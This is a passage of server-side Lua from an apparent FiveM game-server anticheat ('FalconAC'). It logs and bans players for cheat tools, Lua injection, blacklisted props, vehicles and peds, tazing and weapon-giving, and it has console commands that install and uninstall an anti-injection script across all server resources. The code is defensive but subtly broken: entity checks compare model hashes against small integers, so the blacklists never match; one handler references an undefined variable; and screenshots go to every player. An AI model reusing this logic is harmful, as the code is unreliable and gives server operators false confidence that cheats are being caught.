    kickorbancheater(srcc,"Cheat Engine", "Player tried to use cheat engine",true,true)
end)
RegisterServerEvent("falcon:resourcestopp")
AddEventHandler("falcon:resourcestopp", function(resourceName)
    local srcc = source
    TriggerClientEvent("fac:screenshot", -1)
    Wait(150)
    kickorbancheater(srcc,"Resource Stop", "Player tried to stop a resource: "..resourceName,true,true)
end)
RegisterServerEvent("falcon:antieulen")
AddEventHandler("falcon:antieulen", function()
    local srcc = source
    TriggerClientEvent("fac:screenshot", -1)
    Wait(150)
    kickorbancheater(srcc,"Lua Injection", "Player tried to inject a lua script from executor",true,true)
end)

RegisterServerEvent("falcon:aidetection")
AddEventHandler("falcon:aidetection", function(text)
    local srcc = source
    kickorbancheater(srcc,"AI Detection", "Player got banned by AI Detection, blacklisted text: "..text,true,true)
end)

RegisterCommand("entitywipe", function(source, args, raw)
    local playerID = args[1]
        if (playerID ~= nil and tonumber(playerID) ~= nil) then
            EntityWipe(source, tonumber(playerID))
        end
end, false)

function EntityWipe(source, target)
    local _src = source
    TriggerClientEvent("fac:deletentity", -1, tonumber(target))
end

AddEventHandler('entityCreated', function(entity)
    if DoesEntityExist(entity) then
        local src = source
        local model = GetEntityModel(entity)
        if model == 3 then
            for _, blacklistedProps in pairs(Config.BlacklistedObjects) do
                if model == blacklistedProps then
                    TriggerClientEvent('fac:antiProp', -1)
                    TriggerClientEvent("fac:screenshot", -1)
                    Wait(150)
                    kickorbancheater(src,"Blacklist Object Detected", "Prop: "..blacklistedProps.. " https://mwojtasik.dev/tools/gtav/objects/search?name="..blacklistedProps,true,true)
                    CancelEvent()
                    return
                end
            end
        elseif model == 2 then
            for _, blacklistedVeh in pairs(Config.BlacklistedVehicles) do
                if model == blacklistedVeh then
                    TriggerClientEvent('fac:AntiVehicle', -1)
                    TriggerClientEvent("fac:screenshot", -1)
                    Wait(150)
                    kickorbancheater(src,"Blacklist Vehicle Detected", "Vehicle: "..blacklistedVeh.. " https://www.gtabase.com/search?searchword="..blacklistedVeh,true,true)
                    CancelEvent()
                    return
                end
            end
        elseif model == 1 then
            for _, blacklistedPed in pairs(Config.BlacklistedPeds) do
                if model == blacklistedPed then
                    TriggerClientEvent('fac:antiPed', -1)
                    TriggerClientEvent("fac:screenshot", -1)
                    Wait(150)
                    kickorbancheater(src,"Blacklist Ped Detected", "Ped: "..blacklistedPed.. " https://docs.fivem.net/peds/"..blacklistedPed..'.png',true,true)
                    CancelEvent()
                    return
                end
            end
        end
    end
end)

AddEventHandler("weaponDamageEvent", function(sender, data)
    if Config.AntiTaze then
        local _src = sender
        if data.weaponType == 911657153 or data.weaponType == GetHashKey("WEAPON_STUNGUN") then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(_src,"Anti Taze Player", "Tried to taze a player",true,true)
            CancelEvent()
        end
    end
end)

if Config.GiveWeaponsProtection then
    AddEventHandler(
        "giveWeaponEvent",
        function(sender, data)
            if data.givenAsPickup == false then
                TriggerClientEvent("fac:screenshot", -1)
                Wait(150)
                kickorbancheater(sender,"Give Weapon", "Tried to give weapons to another player",true,true)
                CancelEvent()
            end
        end
    )
end

AddEventHandler("giveWeaponEvent", function(source, data)
	if Config.WeaponProtection then
		for _,theWeapon in ipairs(Config.BlacklistedWeapons) do
			if GetHashKey(theWeapon) == data.weaponType then
                TriggerClientEvent("fac:screenshot", -1)
                Wait(150)
                kickorbancheater(sender,"Give Weapon", "Tried to give a blacklisted weapon to a player",true,true)
				break
			end
		end
        if data.ammo > Config.MaxWeaponAmmo then
            TriggerClientEvent("fac:screenshot", -1)
            Wait(150)
            kickorbancheater(sender,"Max Weapon Ammo", "Tried to add "..data.ammo.." ammo to his gun",true,true)
        end
	end
end)

RegisterCommand("facinstall", function(source)
    count = 0
    skip = 0
    if source == 0 then
        local randomtextfile = RandomLetter(12) .. ".lua"
        _antiinjection = LoadResourceFile(GetCurrentResourceName(), "injections.lua")
        for resources = 0, GetNumResources() - 1 do
            local _resname = GetResourceByFindIndex(resources)
            _resourcemanifest = LoadResourceFile(_resname, "__resource.lua")
            _resourcemanifest2 = LoadResourceFile(_resname, "fxmanifest.lua")
            if _resourcemanifest then
                Wait(100)
                _toadd = _resourcemanifest .. "\n\nclient_script '" .. randomtextfile .. "'"
                SaveResourceFile(_resname, randomtextfile, _antiinjection, -1)
                SaveResourceFile(_resname, "__resource.lua", _toadd, -1)
                print("^1[FalconAC]: Anti Injection Installed on ".._resname)
                count = count + 1
            elseif _resourcemanifest2 then
                Wait(100)
                _toadd = _resourcemanifest2 .. "\n\nclient_script '" .. randomtextfile .. "'"
                SaveResourceFile(_resname, randomtextfile, _antiinjection, -1)
                SaveResourceFile(_resname, "fxmanifest.lua", _toadd, -1)
                print("^1[FalconAC]: Anti Injection Installed on ".._resname)
                count = count + 1
            else
                skip = skip + 1
                print("[FalconAC]: Skipped Resource: " .._resname)
            end
        end
        print("[FalconAC] Installation has finished. Succesfully installed Anti-Injection in "..count.." Resources. Skipped: "..skip.." Resources. Enjoy!")
    end
end)

RegisterCommand("facuninstall", function(source, args, rawCommand)
    if source == 0 then
        count = 0
        skip = 0
        if args[1] then
            local filetodelete = args[1] .. ".lua"
            for resources = 0, GetNumResources() - 1 do
                local _resname = GetResourceByFindIndex(resources)
                resourcefile = LoadResourceFile(_resname, "__resource.lua")
                resourcefile2 = LoadResourceFile(_resname, "fxmanifest.lua")
                if resourcefile then
                    deletefile = LoadResourceFile(_resname, filetodelete)
                    if deletefile then
                        _toremove = GetResourcePath(_resname).."/"..filetodelete
                        Wait(100)
                        os.remove(_toremove)
                        print("^1[FalconAC]: Anti Injection Uninstalled on ".._resname)
                        count = count + 1
                    else
                        skip = skip + 1
                        print("[FalconAC]: Skipped Resource: " .._resname)
                    end
                elseif resourcefile2 then
                    deletefile = LoadResourceFile(_resname, filetodelete)
                    if deletefile then
                        _toremove = GetResourcePath(_resname).."/"..filetodelete
                        Wait(100)
                        os.remove(_toremove)
                        print("^1[FalconAC]: Anti Injection Uninstalled on ".._resname)
                        count = count + 1
                    else
                        skip = skip + 1
                        print("[FalconAC]: Skipped Resource: " .._resname)
                    end
                else
                    skip = skip + 1
                    print("[FalconAC]: Skipped Resource: ".._resname)
                end
            end
            print("[FalconAC] UNINSTALLATION has finished. Succesfully uninstalled Anti-Injection in "..count.." Resources. Skipped: "..skip.." Resources. Enjoy!")
        else
            print("[FalconAC] You must write the file name to uninstall Anti-Injection!")
        end
    end
end)

local Charset = {}
for i = 65, 90 do
    table.insert(Charset, string.char(i))
end
for i = 97, 122 do
    table.insert(Charset, string.char(i))
end

RandomLetter = function(length)
    if length > 0 then
        return RandomLetter(length - 1) .. Charset[math.random(1, #Charset)]
    end
    return ""
end